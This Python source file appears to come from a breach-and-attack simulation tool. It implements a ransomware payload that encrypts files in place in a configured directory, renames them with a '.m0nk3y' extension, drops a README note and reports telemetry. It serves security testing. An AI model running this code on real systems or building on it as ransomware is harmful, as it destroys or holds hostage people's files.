import logging
from pathlib import Path
from pprint import pformat
from typing import Callable, List, Optional, Tuple

from common.utils.file_utils import InvalidPath, expand_path
from infection_monkey.ransomware.bitflip_encryptor import BitflipEncryptor
from infection_monkey.telemetry.file_encryption_telem import FileEncryptionTelem
from infection_monkey.telemetry.messengers.i_telemetry_messenger import ITelemetryMessenger
from infection_monkey.utils.environment import is_windows_os

LOG = logging.getLogger(__name__)

EXTENSION = ".m0nk3y"
CHUNK_SIZE = 4096 * 24

README_SRC = Path(__file__).parent / "ransomware_readme.txt"
README_DEST = "README.txt"


class RansomwarePayload:
    def __init__(
        self,
        config: dict,
        select_files: Callable[[Path], List[Path]],
        leave_readme: Callable[[Path, Path], None],
        telemetry_messenger: ITelemetryMessenger,
    ):
        LOG.debug(f"Ransomware payload configuration:\n{pformat(config)}")

        self._encryption_enabled = config["encryption"]["enabled"]
        self._readme_enabled = config["other_behaviors"]["readme"]

        self._target_dir = RansomwarePayload.get_target_dir(config)
        self._new_file_extension = EXTENSION

        self._encryptor = BitflipEncryptor(chunk_size=CHUNK_SIZE)
        self._select_files = select_files
        self._leave_readme = leave_readme
        self._telemetry_messenger = telemetry_messenger

    @staticmethod
    def get_target_dir(config: dict):
        target_directories = config["encryption"]["directories"]
        if is_windows_os():
            target_dir_field = target_directories["windows_target_dir"]
        else:
            target_dir_field = target_directories["linux_target_dir"]

        try:
            return expand_path(target_dir_field)
        except InvalidPath as e:
            LOG.debug(f"Target ransomware dir set to None: {e}")
            return None

    def run_payload(self):
        if not self._target_dir:
            return

        LOG.info("Running ransomware payload")

        if self._encryption_enabled:
            file_list = self._find_files()
            self._encrypt_files(file_list)

        if self._readme_enabled:
            self._leave_readme(README_SRC, self._target_dir / README_DEST)

    def _find_files(self) -> List[Path]:
        LOG.info(f"Collecting files in {self._target_dir}")
        return sorted(self._select_files(self._target_dir))

    def _encrypt_files(self, file_list: List[Path]) -> List[Tuple[Path, Optional[Exception]]]:
        LOG.info(f"Encrypting files in {self._target_dir}")

        results = []
        for filepath in file_list:
            try:
                LOG.debug(f"Encrypting {filepath}")
                self._encryptor.encrypt_file_in_place(filepath)
                self._add_extension(filepath)
                self._send_telemetry(filepath, True, "")
            except Exception as ex:
                LOG.warning(f"Error encrypting {filepath}: {ex}")
                self._send_telemetry(filepath, False, str(ex))

        return results

    def _add_extension(self, filepath: Path):
        new_filepath = filepath.with_suffix(f"{filepath.suffix}{self._new_file_extension}")
        filepath.rename(new_filepath)

    def _send_telemetry(self, filepath: Path, success: bool, error: str):
        encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
        self._telemetry_messenger.send_telemetry(encryption_attempt)
